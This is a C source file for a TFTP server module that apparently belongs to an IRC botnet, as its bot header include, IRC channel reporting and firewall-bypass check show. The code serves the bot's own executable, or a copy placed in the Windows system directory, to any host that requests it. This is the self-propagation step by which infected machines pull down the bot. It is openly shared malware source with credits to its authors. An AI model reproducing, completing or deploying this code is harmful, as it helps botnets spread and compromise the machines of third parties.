

#ifndef NO_TFTPD
#include "..\Bot\bt1.h"

//TFTPD, Orignally Made By dummy52, Recoded And Optimized By dope
DWORD WINAPI tftpd(LPVOID param)
{
	BOOL bOptVal = TRUE;
	char szBuffer[4];
	DWORD dwThread;
	int bOptLen = sizeof(BOOL), iOptVal, iOptLen = sizeof(int);
	register int i;
	SOCKET sock;
	struct tftp tftps;
	struct sockaddr_in sin;
	tftp tftps1 = *((tftp *)param);
//	WSADATA wsadata;

#ifndef NO_DEBUG
		printf("[DEBUG] Starting TFTPD, tftpd()\n");
#endif
		
//	if (WSAStartup(MAKEWORD(2, 2), &wsadata) != 0) return 0;
		sin.sin_family = AF_INET;
		sin.sin_port = htons(tftps1.iPort);
		sin.sin_addr.s_addr = INADDR_ANY;
		i = sizeof(sin);
		sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	if (sock == INVALID_SOCKET) return 0;
		tftps.iPort = tftps1.iPort;
		tftps.bsock = tftps1.bsock;
		sprintf(tftps.szFileName, tftps1.szFileName);
		sprintf(tftps.szAction, tftps1.szAction);
		sprintf(tftps.szChannel, tftps1.szChannel);
		setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, (char *)&iOptVal, iOptLen);
	if (bind(sock, (struct sockaddr *)&sin, i) == SOCKET_ERROR) return 0;
	while (1)
	{
		if (recvfrom(sock, szBuffer, sizeof(szBuffer), 0, (SOCKADDR *)&sin, &i))
		{
			if (szBuffer[0] == 0 && szBuffer[1] == 1) //RRQ
			{
					tftps.sin = sin;
					CreateThread(NULL, 0, &tftpd_handler, &tftps, 0, &dwThread);
			}
			if (szBuffer[0] == 0 && szBuffer[1] == 2) //WRQ
			{
					sendto(sock, "\x00\x05\x00\x04\x6B\x74\x68\x78\x00", 9, 0, (struct sockaddr *)&sin, sizeof(sin)); //Illegal Operation With A Message
			}
		}
			Sleep(500);
	}
		closesocket(sock);
//		WSACleanup();
		return 0;
}

//TFTPD Handler
DWORD WINAPI tftpd_handler(LPVOID param)
{
	char szBuff[MEDBUF], szFilePath[MAX_PATH];
	int blockid, size = 0;
	struct sockaddr_in sin;
	struct TFTP_PACKET szPacket;
	struct TFTP_RECEIVE szReceive;
	register int sinlen = sizeof(sin);
	SOCKET sock;
	tftp tftps = *((tftp *)param);
	FILE *f = 0;

#ifndef NO_DEBUG
		printf("[DEBUG] Starting TFTPD handling thread, tftpd_handler()\n");
#endif

		sin = tftps.sin;
		GetModuleFileName(GetModuleHandle(NULL), szFilePath, sizeof(szFilePath));

#ifndef NO_FWB
	if (is_fwb())
	{		
		char szSysDir[MAX_PATH];
			GetSystemDirectory(szSysDir, sizeof(szSysDir));
			sprintf(szFilePath, "%s\\%s", szSysDir, tftps.szFileName);
	}
#endif

		sprintf(szBuff, "[TFTP] File Transfer Started To: %s (%s).", inet_ntoa(sin.sin_addr), szFilePath);
		irc_msg(tftps.bsock, tftps.szAction, tftps.szChannel, szBuff);
		sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	if (sock == INVALID_SOCKET) return 0;
		f = fopen(szFilePath, "rb");
	if (f == NULL) return 0;
		blockid = 0;
	while (!feof(f))
	{
			blockid++;
			szPacket.blockid = htons(blockid);
			szPacket.opcode = htons(3); //DATA
			size = fread(szPacket.data, sizeof(char), sizeof(szPacket.data), f);
		if (sendto(sock, (char *)&szPacket, size + 4, 0, (struct sockaddr *)&sin, sinlen) == SOCKET_ERROR) goto end;
		if (recvfrom(sock, (char *)&szReceive, sizeof(szReceive), 0, (struct sockaddr *)&sin, &sinlen) == SOCKET_ERROR) goto end;
		if (ntohs(szReceive.opcode) != 4 || ntohs(szReceive.blockid) != blockid) goto end; //ACK
		if (ntohs(szReceive.opcode) == 5) goto end; //ERR
	}
		sprintf(szBuff, "[TFTP] File Transfer Finished To: %s (%s).", inet_ntoa(sin.sin_addr), szFilePath);
		irc_msg(tftps.bsock, tftps.szAction, tftps.szChannel, szBuff);
		closesocket(sock);
		fclose(f);
		return 0;
	end:
		sprintf(szBuff, "[TFTP] File Transfer Failed To: %s (%s)!", inet_ntoa(sin.sin_addr), szFilePath);
		irc_msg(tftps.bsock, tftps.szAction, tftps.szChannel, szBuff);
		closesocket(sock);
		fclose(f);
		return 0;
}
#endif